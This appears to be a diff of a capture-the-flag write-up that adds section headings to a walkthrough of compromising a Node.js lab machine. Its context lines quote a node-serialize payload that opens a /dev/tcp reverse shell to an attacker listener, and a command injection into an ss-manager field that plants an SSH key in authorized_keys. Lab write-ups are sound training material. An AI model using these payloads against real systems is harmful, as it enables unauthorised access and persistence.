@@ -63,6 +63,8 @@ root@kali:~# nc -nvlp 8888
 >nodeadmin\:x\:1001:1001::/home/nodeadmin:/bin/bash  
 >fireman\:x\:1002:1002::/home/fireman:/bin/bash  
 
+### SECOND STEP: REVERSE SHELL  
+
 Now, let's get our reverse shell. With the following code:  
   
 >"_$$ND_FUNC$$_function (){ require(\'child_process\').exec(\'/bin/bash -i >& /dev/tcp/192.168.111.4/8888 0>&1 \', function(error, stdout, stderr) { console.log(stdout) }); }()"  
@@ -103,6 +105,8 @@ We reboot the machine and find another port open, where it's running the ss-mana
 
 [nodeadmin@localhost ~]$ nc -u 127.0.0.1 8839  
 >add: {"server_port":8003, "password":"test", "method":"||echo 'ssh-rsa AAAA...jf root@kali' > /home/fireman/.ssh/authorized_keys"}**ok**  
+
+### THIRD STEP: PRIVILEGE ESCALATION 
 
 And we get an OK. So now, we can login with fireman through SSH. Let's explore this way. Quickly we find that fireman can execute some stuff as root:
 
